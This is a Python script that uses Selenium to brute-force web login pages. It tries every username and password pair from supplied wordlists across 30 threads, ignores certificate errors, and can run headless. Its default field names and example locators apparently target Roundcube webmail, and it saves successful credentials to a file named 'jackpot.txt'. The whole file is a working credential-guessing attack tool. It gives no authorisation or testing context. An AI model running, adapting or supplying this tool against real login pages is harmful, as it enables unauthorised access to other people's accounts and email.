import threading
from concurrent.futures import ThreadPoolExecutor
import argparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
import time

# Function to attempt login with a username and password
def attempt_login(url, username, password, login_button_locator, presence_of_element_locator, error_message_locator, error_message_string, successful_logins, lock, headless=False):
    service = Service(ChromeDriverManager().install())
    options = webdriver.ChromeOptions()
    options.add_argument('--ignore-certificate-errors')
    options.set_capability('acceptInsecureCerts', True)
    if headless:
        options.add_argument('--headless')
        options.add_argument('--disable-gpu')
    
    driver = webdriver.Chrome(service=service, options=options)
    driver.get(url)
    
    try:
        WebDriverWait(driver, 2).until(
            EC.presence_of_element_located((By.NAME, '_user'))
        )
        
        username_field = driver.find_element(By.NAME, '_user')
        username_field.send_keys(username)
        
        password_field = driver.find_element(By.NAME, '_pass')
        password_field.send_keys(password)
        
        login_button = driver.find_element(*login_button_locator)
        login_button.click()
        
        try:
            WebDriverWait(driver, 2).until(
                EC.presence_of_element_located(presence_of_element_locator)
            )
            with lock:
                successful_logins.append(f"Login successful with username: {username} and password: {password}")
            print(f"\n$$$$$$ Login successful with username: {username} and password: {password} $$$$$$\n")
        except:
            if check_for_error_message(driver, error_message_locator, error_message_string):
                print(f"Login failed with username: {username} and password: {password} (error message found)")
            else:
                print(f"Login failed with username: {username} and password: {password} (no specific error message found)")
    except Exception as e:
        print(f"Error with username {username} and password {password}: {e}")
    finally:
        driver.quit()

# Function to check for error messages indicating a failed login
def check_for_error_message(driver, error_message_locator, error_message_string):
    try:
        error_message = driver.find_element(*error_message_locator)
        if error_message.is_displayed() and error_message_string in error_message.text:
            print(f"Error message: {error_message.text}")
            return True
    except:
        return False

# Main function to handle arguments and start the login attempts
def main():
    parser = argparse.ArgumentParser(description="Login attempt script with optional headless mode. Common locators: id, name, class_name, tag_name, css_selector, xpath.")
    parser.add_argument('--url', required=True, help="The login URL.")
    parser.add_argument('--username_file', required=True, help="Path to the file containing usernames.")
    parser.add_argument('--password_file', required=True, help="Path to the file containing passwords.")
    parser.add_argument('--login_button', required=True, help="The login button locator (e.g., 'id:rcmloginsubmit').")
    parser.add_argument('--presence_of_element', required=True, help="Locator for the element that confirms login (e.g., 'id:mailboxlist').")
    parser.add_argument('--error_message_locator', required=True, help="Locator for the error message element (e.g., 'class_name:alert-warning').")
    parser.add_argument('--error_message_string', required=True, help="String to look for in the error message.")
    parser.add_argument('--headless', action='store_true', help="Run browser in headless mode.")
    args = parser.parse_args()

    login_button_type, login_button_value = args.login_button.split(':', 1)
    login_button_locator = (getattr(By, login_button_type.upper()), login_button_value)
    
    presence_of_element_type, presence_of_element_value = args.presence_of_element.split(':', 1)
    presence_of_element_locator = (getattr(By, presence_of_element_type.upper()), presence_of_element_value)

    error_message_type, error_message_value = args.error_message_locator.split(':', 1)
    if error_message_type.lower() == 'class':
        error_message_type = 'class_name'
    error_message_locator = (getattr(By, error_message_type.upper()), error_message_value)

    with open(args.username_file, 'r') as file:
        username_list = file.read().splitlines()

    with open(args.password_file, 'r') as file:
        password_list = file.read().splitlines()

    successful_logins = []
    lock = threading.Lock()

    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = []
        for username in username_list:
            for password in password_list:
                futures.append(executor.submit(attempt_login, args.url, username, password, login_button_locator, presence_of_element_locator, error_message_locator, args.error_message_string, successful_logins, lock, args.headless))
        for future in futures:
            future.result()

    if successful_logins:
        with open('jackpot.txt', 'w') as f:
            for login in successful_logins:
                f.write(login + "\n")
        print("\nAll successful logins have been saved to jackpot.txt.")
    else:
        print("\nNo successful logins found.")

if __name__ == "__main__":
    main()
